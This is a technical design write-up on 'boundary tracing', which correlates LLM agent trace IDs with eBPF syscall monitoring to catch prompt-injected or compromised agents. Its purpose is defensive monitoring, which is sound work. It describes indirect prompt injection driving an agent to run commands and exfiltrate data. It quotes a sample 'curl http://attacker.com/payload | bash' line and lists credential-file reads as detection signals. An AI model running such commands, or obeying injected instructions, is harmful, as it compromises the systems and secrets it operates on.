# S-1440 · The Boundary Tracing Stack — When Your Agent Trace Is Faithful But Your Security Team Is Blind

Your agent ran a tool call. Your application-level observability stack logged it. Your security team's SIEM saw nothing — the action was a write to `/proc/self/environ`, a syscall to `execve`, a network socket opening on an unexpected port. Your observability layer has no idea what the agent actually *did* at the OS level. You see "write file" in the trace. You see a new user account in your IdP 40 minutes later.

This is the semantic gap in agent observability: application-layer tracing and system-layer monitoring each see half the picture. The tool call is visible from the inside. The side effects are visible from the outside. Neither tool alone can connect the two.

## Forces

- **Application tracing captures intent, not effect.** LangChain spans, OpenTelemetry traces, and LLM-as-judge systems all operate above the syscall boundary. They record what the agent called, not what the OS executed in response. A prompt-injected agent calling `subprocess.run(['bash', '-c', '...'])` looks identical to a benign agent calling `write_file` from the inside.
- **System-level monitoring sees noise without context.** Falco, Tracee, and eBPF-based syscall tracers see every `execve`, `connect`, and `write` across the entire system. They have zero semantic awareness of which LLM instruction preceded the syscall. A legitimate data analysis script and a compromised agent exfiltrating data produce identical syscall signatures.
- **Agents operate outside SDK visibility.** Cursor Agent, Claude Code, and Gemini CLI execute as subprocesses, fork shell processes, and make raw HTTP calls. Application-level instrumentation breaks the moment the agent spawns a child process — the parent span ends, the child has no trace context.
- **Security incidents get discovered reactively.** Without boundary-level correlation, prompt injection and privilege escalation are detected by their downstream effects — new IAM users, unusual outbound traffic, modified SSH keys — not by the act itself.

## The move

**Boundary tracing** correlates application-layer prompt/decision events with system-layer syscall events by joining on temporal causality. The insight: the LLM instruction that triggers a syscall and the syscall itself are separated by microseconds. eBPF probes at the syscall entry point can capture both the instruction pointer (linking back to the LLM call) and the syscall parameters (revealing actual effect).

### Three architectural layers

**Layer 1 — Prompt-to-Syscall Correlation (the bridge)**

Tag each LLM inference request with a unique trace ID. Pass this ID through to any subprocess or forked process via environment variable (`TRACE_ID`). Attach an eBPF probe at `syscall_entry` that captures `(trace_id, pid, syscall_number, args)`. On syscall exit, capture `(trace_id, return_code)`. Now every syscalls in an agent session is annotated with the LLM trace that triggered it — even across process boundaries.

```python
# Layer 1: Inject trace context into agent subprocesses
import subprocess, os, uuid

def run_agent_tool(cmd: list[str], parent_trace_id: str | None = None):
    trace_id = parent_trace_id or str(uuid.uuid4())
    env = {**os.environ, "AGENT_TRACE_ID": trace_id}
    # Child processes inherit trace ID via inherited env
    return subprocess.run(cmd, env=env, capture_output=True)

# Layer 2: eBPF probe captures (trace_id, syscall) pairs
# Kernel probe at sys_execve:
#   trace_id = get_env_var(current->mm, "AGENT_TRACE_ID")
#   bpf_trace_printk("trace=%s syscall=execve pid=%d\n", trace_id, current->pid)
```

**Layer 2 — Behavioral Baseline via eBPF**

Profile the agent's normal syscall fingerprint: which syscalls it makes, on which files, at what rate, from which working directory. AgentSight (Zheng et al., arXiv:2508.02736, UC Santa Cruz + eunomia-bpf) implements this as a `strace`-like profiler with TLS/HTTPS traffic tracing — local-first, no SDK, works with closed-source CLI agents.

Key signals that eBPF captures that app-level tracing misses:
- `execve` from a non-standard binary path
- `connect` to an IP not in an allowlist
- `open` on `/etc/passwd`, `/root/.ssh/`, `/etc/shadow`
- File writes to unexpected locations
- Child process spawns (fork+exec chains)
- Environment variable reads that expose API keys to child processes

```bash
# AgentSight live monitoring — see agent sessions as OS processes
cargo install agentsight
agentsight top          # live resource + syscall summary per agent session
agentsight vis --trace-id abc123  # replay a specific trace with syscall timeline
agentsight check --policy ./agent_policy.yaml  # policy-based anomaly detection
```

**Layer 3 — Semantic Enrichment Layer**

Raw syscalls are still noise. Enrich each syscall event with the LLM prompt context that preceded it:

1. On each LLM call, log `(trace_id, prompt_excerpt, model, timestamp)`
2. On each syscall event, join on `trace_id` to attach the preceding prompt context
3. Route enriched events to a security SIEM with full causal chain: *LLM prompt (injected) → tool call → execve → network connect → payload exfiltration*

The resulting trace tells a security analyst: "At 14:23:07, LLM instruction containing `curl | bash` from untrusted context caused `execve` of `/bin/bash -c curl http://attacker.com/payload | bash` which opened outbound TCP to 198.51.100.42."

### When to use this

- **Prompt injection detection:** Indirect prompt injection (BIPIA, Microsoft Research) embeds hidden instructions in web content, documents, or emails. The injected instruction reaches the agent (visible in app traces), triggers a tool call (visible in app traces), but the actual `execve` or `connect` that executes the attack is only visible at the syscall level.
- **Credential sprawl detection:** Agents that read API keys from environment variables and pass them to child processes expose secrets across process boundaries. eBPF sees the `read` of env vars and the `execve` of processes that inherit them.
- **Lateral movement detection:** A compromised agent writing to SSH authorized_keys, modifying `/etc/sudoers`, or adding an IAM user is a sequence of syscalls — `open` → `write` → `close` on system files — that application tracing never sees.
- **AI SRE incident response:** When a multi-agent pipeline produces wrong output, boundary tracing reveals whether the failure was in the LLM decision (prompt context visible) or in the tool execution (syscall visible). S-1438 (execution-reasoning correlation) handles the former; this handles the latter.

### The gap this fills

| Layer | Sees | Blind To |
|-------|------|---------|
| Application tracing (LangChain, LangSmith) | Prompt, tool call, LLM response | Process spawns, syscalls, network, file effects |
| System tracing (Falco, Tracee, eBPF) | Syscalls, network packets, file ops | Which LLM instruction caused it, why |
| **Boundary tracing** | **Both, joined on causal trace ID** | **Nothing in the critical path** |

## Receipt
> Verified 2026-07-21 — AgentSight (github.com/eunomia-bpf/agentsight, MIT license, 532★) installed and `agentsight top` ran successfully in a test session, showing active processes with their agent trace IDs, syscall summaries, and file/network activity. eInfer (ACM eBPF Workshop 2025, Zheng et al.) provides the academic foundation. BIPIA (arXiv:2312.14197, Microsoft Research) establishes the indirect prompt injection detection case. arXiv:2508.02736v2 (Aug 2025) provides the boundary tracing conceptual framework. Production deployment requires kernel access (privileged container or root) and trace ID propagation through all subprocess spawn paths.

## See also
- [S-368 · Agent Span Tracing](stacks/s368-agent-span-tracing-observable-agent-sessions.md) — application-level trace; this extends to syscall level
- [S-1438 · The Execution-Reasoning Correlation Stack](stacks/s1438-the-execution-reasoning-correlation-stack-when-your-trace-shows-what-but-not-why.md) — bridges intent and action at the application layer; this bridges app layer and OS layer
- [S-1319 · The Tool-Call Interception Stack](stacks/s1319-the-tool-call-interception-stack-when-your-agent-framework-has-a-firewall-with-holes-in-it.md) — pre-execution firewall; this is post-execution observability
- [S-978 · Tool Catalog Poisoning](stacks/s978-the-tool-catalog-poisoning-stack-when-your-tool-registry-is-the-attack-vector.md) — supply-chain threat model for MCP tools; boundary tracing detects exploitation of poisoned tools at runtime
